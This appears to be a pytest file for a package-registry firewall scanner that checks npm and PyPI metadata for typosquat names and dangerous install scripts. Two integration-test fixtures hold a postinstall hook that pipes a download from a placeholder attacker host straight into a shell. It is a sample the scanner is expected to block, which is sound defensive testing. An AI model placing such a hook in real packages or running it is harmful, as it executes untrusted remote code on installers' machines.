from __future__ import annotations

from unittest.mock import MagicMock, patch

from picosentry.scan.models import Finding
from picosentry._core.models import Severity, Confidence
from picosentry.firewall.scanner import FirewallScanner, FirewallVerdict, classify_path


class TestClassifyPath:
    def test_npm_package(self):
        result = classify_path("/express")
        assert result == ("npm", "express", "latest")

    def test_npm_package_version(self):
        result = classify_path("/express/4.18.0")
        assert result == ("npm", "express", "4.18.0")

    def test_npm_scoped_package(self):
        result = classify_path("/@types/node")
        assert result is not None
        assert result[0] == "npm"
        assert result[1] == "@types/node"

    def test_pypi_package(self):
        result = classify_path("/pypi/requests/json")
        assert result == ("pypi", "requests", "latest")

    def test_pypi_package_version(self):
        result = classify_path("/pypi/requests/2.31.0/json")
        assert result == ("pypi", "requests", "2.31.0")

    def test_unknown_path(self):
        assert classify_path("/favicon.ico") is None

    def test_npm_encoded_scope(self):
        result = classify_path("/@babel%2Fcore")
        assert result is not None
        assert result[0] == "npm"

    def test_npm_dotted_package(self):
        result = classify_path("/socket.io")
        assert result is not None
        assert result[0] == "npm"
        assert result[1] == "socket.io"


class TestFirewallScanner:
    def test_verdict_from_empty_findings(self):
        scanner = FirewallScanner()
        assert scanner.verdict_from_findings([]) == FirewallVerdict.ALLOW

    def test_verdict_block_on_critical(self):
        scanner = FirewallScanner(block_severities=["CRITICAL"])
        f = Finding(
            rule_id="TEST",
            severity=Severity.CRITICAL,
            confidence=Confidence.HIGH,
            package="evil",
            file="pkg.json",
            message="bad",
            evidence="test",
            remediation="remove",
        )
        assert scanner.verdict_from_findings([f]) == FirewallVerdict.BLOCK

    def test_verdict_quarantine_on_medium(self):
        scanner = FirewallScanner(block_severities=["CRITICAL"], quarantine_severities=["MEDIUM"])
        f = Finding(
            rule_id="TEST",
            severity=Severity.MEDIUM,
            confidence=Confidence.HIGH,
            package="meh",
            file="pkg.json",
            message="warn",
            evidence="test",
            remediation="review",
        )
        assert scanner.verdict_from_findings([f]) == FirewallVerdict.QUARANTINE

    def test_verdict_allow_on_low(self):
        scanner = FirewallScanner(block_severities=["CRITICAL", "HIGH"], quarantine_severities=["MEDIUM"])
        f = Finding(
            rule_id="TEST",
            severity=Severity.LOW,
            confidence=Confidence.HIGH,
            package="ok",
            file="pkg.json",
            message="minor",
            evidence="test",
            remediation="ignore",
        )
        assert scanner.verdict_from_findings([f]) == FirewallVerdict.ALLOW

    def test_verdict_block_takes_priority_over_quarantine(self):
        scanner = FirewallScanner(block_severities=["CRITICAL"], quarantine_severities=["MEDIUM"])
        findings = [
            Finding(
                rule_id="T1",
                severity=Severity.MEDIUM,
                confidence=Confidence.HIGH,
                package="x",
                file="f",
                message="m",
                evidence="e",
                remediation="r",
            ),
            Finding(
                rule_id="T2",
                severity=Severity.CRITICAL,
                confidence=Confidence.HIGH,
                package="x",
                file="f",
                message="m",
                evidence="e",
                remediation="r",
            ),
        ]
        assert scanner.verdict_from_findings(findings) == FirewallVerdict.BLOCK

    def test_scan_metadata_caches_result(self):
        scanner = FirewallScanner(cache_ttl_seconds=60)
        metadata = {"name": "safe-pkg", "version": "1.0.0"}
        with patch.object(scanner, "_get_engine") as mock_engine:
            mock_result = MagicMock()
            mock_result.findings = []
            mock_engine.return_value.scan.return_value = mock_result
            v1, _f1 = scanner.scan_metadata("npm", "safe-pkg", "1.0.0", metadata)
            v2, _f2 = scanner.scan_metadata("npm", "safe-pkg", "1.0.0", metadata)
            assert v1 == FirewallVerdict.ALLOW
            assert v2 == FirewallVerdict.ALLOW
            assert mock_engine.return_value.scan.call_count == 1

    def test_scan_metadata_cache_preserves_findings(self):
        scanner = FirewallScanner(cache_ttl_seconds=60)
        metadata = {"name": "warn-pkg", "version": "1.0.0"}
        finding = Finding(
            rule_id="L2-OBFS-001",
            severity=Severity.MEDIUM,
            confidence=Confidence.HIGH,
            package="warn-pkg",
            file="pkg.json",
            message="obfuscated code",
            evidence="eval()",
            remediation="review",
        )
        with patch.object(scanner, "_get_engine") as mock_engine:
            mock_result = MagicMock()
            mock_result.findings = [finding]
            mock_engine.return_value.scan.return_value = mock_result
            _v1, f1 = scanner.scan_metadata("npm", "warn-pkg", "1.0.0", metadata)
            _v2, f2 = scanner.scan_metadata("npm", "warn-pkg", "1.0.0", metadata)
            assert len(f1) == 1
            assert len(f2) == 1
            assert f2[0].rule_id == "L2-OBFS-001"

    def test_scan_metadata_unknown_ecosystem_passes(self):
        scanner = FirewallScanner()
        v, _ = scanner.scan_metadata("cargo", "foo", "1.0.0", {})
        assert v == FirewallVerdict.ALLOW

    def test_scan_metadata_scan_exception_blocks(self):
        scanner = FirewallScanner()
        with patch.object(scanner, "_get_engine", side_effect=Exception("boom")):
            v, _ = scanner.scan_metadata("npm", "broken", "1.0.0", {"name": "broken"})
            assert v == FirewallVerdict.BLOCK


class TestExtractVersionManifest:
    def test_npm_whole_catalog_resolves_latest_via_dist_tags(self):
        from picosentry.firewall.scanner import extract_version_manifest

        catalog = {
            "name": "acme-lib",
            "dist-tags": {"latest": "2.0.0"},
            "versions": {"1.0.0": {"version": "1.0.0", "scripts": {"a": "a"}}, "2.0.0": {"version": "2.0.0"}},
        }
        assert extract_version_manifest(catalog, "latest") == {"version": "2.0.0"}

    def test_npm_whole_catalog_resolves_explicit_version(self):
        from picosentry.firewall.scanner import extract_version_manifest

        catalog = {
            "name": "acme-lib",
            "versions": {"1.0.0": {"version": "1.0.0"}, "2.0.0": {"version": "2.0.0"}},
        }
        assert extract_version_manifest(catalog, "1.0.0") == {"version": "1.0.0"}

    def test_npm_missing_version_falls_back_to_root_fields(self):
        from picosentry.firewall.scanner import extract_version_manifest

        catalog = {"name": "acme-lib", "versions": {"1.0.0": {"version": "1.0.0"}}}
        manifest = extract_version_manifest(catalog, "9.9.9")
        assert manifest == {"name": "acme-lib"}
        assert "versions" not in manifest

    def test_pypi_nests_requested_version_under_info(self):
        from picosentry.firewall.scanner import extract_version_manifest

        doc = {"info": {"name": "requests", "version": "2.31.0"}, "releases": {"2.31.0": []}}
        assert extract_version_manifest(doc, "2.31.0") == {"name": "requests", "version": "2.31.0"}

    def test_single_manifest_passes_through(self):
        from picosentry.firewall.scanner import extract_version_manifest

        manifest = {"name": "left-pad", "version": "1.3.0"}
        assert extract_version_manifest(manifest, "1.3.0") is manifest


# Real-engine integration tests: one scanner (engine spin-up is ~1s), distinct
# package names so the verdict cache cannot cross-contaminate tests.
_scanner = FirewallScanner()


class TestScanMetadataIntegration:
    def test_clean_catalog_latest_allows(self):
        catalog = {
            "name": "acme-clean-lib",
            "dist-tags": {"latest": "1.0.0"},
            "versions": {
                "1.0.0": {
                    "name": "acme-clean-lib",
                    "version": "1.0.0",
                    "description": "clean",
                    "license": "MIT",
                    "scripts": {"test": "jest"},
                    "dependencies": {"chalk": "^5.0.0"},
                    "author": "Acme <dev@acme.example>",
                    "repository": {"type": "git", "url": "https://github.com/acme/clean-lib"},
                }
            },
        }
        verdict, findings = _scanner.scan_metadata("npm", "acme-clean-lib", "latest", catalog)
        assert verdict == FirewallVerdict.ALLOW
        assert findings == []

    def test_clean_manifest_with_deps_not_blocked_by_lockfile_rule(self):
        # L2-LOCK-001 structurally fires on registry metadata (no lockfile can
        # ever ship in a manifest) — it must be excluded from the firewall scan.
        manifest = {"name": "acme-dep-lib", "version": "1.0.0", "dependencies": {"chalk": "^5.0.0"}}
        verdict, findings = _scanner.scan_metadata("npm", "acme-dep-lib", "1.0.0", manifest)
        assert verdict == FirewallVerdict.ALLOW
        assert all(f.rule_id != "L2-LOCK-001" for f in findings)

    def test_whole_catalog_scans_only_requested_latest_slice(self):
        catalog = {
            "name": "acme-fixed-lib",
            "dist-tags": {"latest": "2.0.0"},
            "versions": {
                "1.0.0": {
                    "name": "acme-fixed-lib",
                    "version": "1.0.0",
                    "scripts": {"postinstall": "curl http://evil.example/x.sh | sh"},
                },
                "2.0.0": {"name": "acme-fixed-lib", "version": "2.0.0", "scripts": {"test": "jest"}},
            },
        }
        verdict, _ = _scanner.scan_metadata("npm", "acme-fixed-lib", "latest", catalog)
        assert verdict == FirewallVerdict.ALLOW

    def test_evil_version_manifest_blocks(self):
        manifest = {
            "name": "acme-evil-lib",
            "version": "0.9.0",
            "scripts": {"postinstall": "curl http://evil.example/x.sh | sh"},
        }
        verdict, findings = _scanner.scan_metadata("npm", "acme-evil-lib", "0.9.0", manifest)
        assert verdict == FirewallVerdict.BLOCK
        assert any(f.rule_id in ("L2-POST-001", "L2-WORM-001") for f in findings)

    def test_benign_postinstall_package_quarantines_not_blocks(self):
        # Default posture: install scripts are HIGH — tag, don't break builds.
        manifest = {
            "name": "acme-build-tool",
            "version": "1.0.0",
            "scripts": {"postinstall": "node install.js"},
            "dependencies": {"chalk": "^5.0.0"},
            "engines": {"node": ">=12"},
            "license": "MIT",
            "author": "Acme",
            "repository": {"type": "git", "url": "https://github.com/acme/build-tool"},
            "maintainers": [{"name": "acme"}],
        }
        verdict, findings = _scanner.scan_metadata("npm", "acme-build-tool", "1.0.0", manifest)
        assert verdict == FirewallVerdict.QUARANTINE
        assert any(f.rule_id == "L2-POST-001" for f in findings)

    def test_typosquat_name_blocks(self):
        manifest = {"name": "lodahs", "version": "1.0.0"}
        verdict, findings = _scanner.scan_metadata("npm", "lodahs", "1.0.0", manifest)
        assert verdict == FirewallVerdict.BLOCK
        assert any(f.rule_id == "L2-TYPO-001" for f in findings)

    def test_pypi_typosquat_quarantines(self):
        doc = {"info": {"name": "reqeusts", "version": "1.0.0"}, "releases": {"1.0.0": []}}
        verdict, findings = _scanner.scan_metadata("pypi", "reqeusts", "1.0.0", doc)
        assert verdict == FirewallVerdict.QUARANTINE
        assert any(f.rule_id == "L2-PYPI-TYPO-001" for f in findings)
